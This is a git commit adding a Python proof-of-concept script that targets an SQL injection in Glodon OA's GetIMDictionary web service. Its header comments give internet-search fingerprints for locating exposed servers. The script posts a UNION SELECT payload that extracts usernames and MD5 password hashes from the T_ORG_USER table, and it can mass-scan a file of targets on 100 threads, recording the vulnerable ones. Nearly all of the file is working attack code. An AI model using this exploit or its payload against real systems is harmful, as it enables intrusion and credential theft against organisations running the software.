94b0207489bad07a4e98f74ae701fbf9ddf946fd
Sarah0x7e <165890913+Sarah0x7e@users.noreply.github.com>
2024-06-16 22:49:36 +0800

    Add files via upload

---
+++ GLD_sql.py
@@ -0,0 +1,87 @@
+#广联达OA SQL注入漏洞位于 /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary 接口下，直接访问，页面会提示缺少参数key，说明存在SQL注入
+#fofa：fid="/yV4r5PdARKT4jaqLjJYqw=="或者body="/Services/Identification/Server"
+#hunter:web.body="/Services/Identification/Server/"
+# 导包
+import requests,sys,argparse,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
+# 指纹模块
+def banner():
+    banner = """
+
+ ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
+▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
+▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
+░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
+ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
+ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
+  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
+  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
+      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
+                                     ░                                                        
+                                    author:           sawa
+                                    version:          1.0.0
+                                    For:              广联达oa sql 注入漏洞
+"""
+    print(banner)
+
+# poc模块
+def poc(target):
+    payload_url ="/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
+    url = target+payload_url
+    headers = {
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Accept-Encoding':'gzip, deflate',
+        'Connection':'close',
+        'Upgrade-Insecure-Requests':'1',
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Content-Length':'78',
+    }
+    data="key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
+    try:
+        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
+        match = re.search(r'value="admin:(\w+)"',res.text)
+        if  res.status_code == 200 and match.group(1) in res.text: #and  "admin" in res.text:
+            print("[+]该站点存在sql注入漏洞,url:"+target)
+            with open ('result.txt','a',encoding='utf-8') as fp:
+                    fp.write(target+"\n")
+        else :
+            print("[-]该站点不存在sql注入漏洞 ,url:"+target)
+            with open ('without-bug.txt','a',encoding='utf-8') as fp:
+                    fp.write(target+"\n")        
+    except Exception as e:
+        print("[*]连接出现问题，请手动进行测试该站点,url="+target)
+        with open ('warning.txt','a',encoding='utf-8') as fp:
+                        fp.write(target+"\n")
+
+# 主函数模块
+def main():
+    # 先调用指纹
+    banner()
+    # 描述信息
+    parser = argparse.ArgumentParser(description="this is a 广联达oa SQL注入漏洞")
+    # -u指定单个url检测， -f指定批量url进行检测
+    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
+    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
+    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
+    # 调用
+    args = parser.parse_args()
+    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close
+        mp.join
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+# 主函数入口
+if __name__ == "__main__":
+    main()
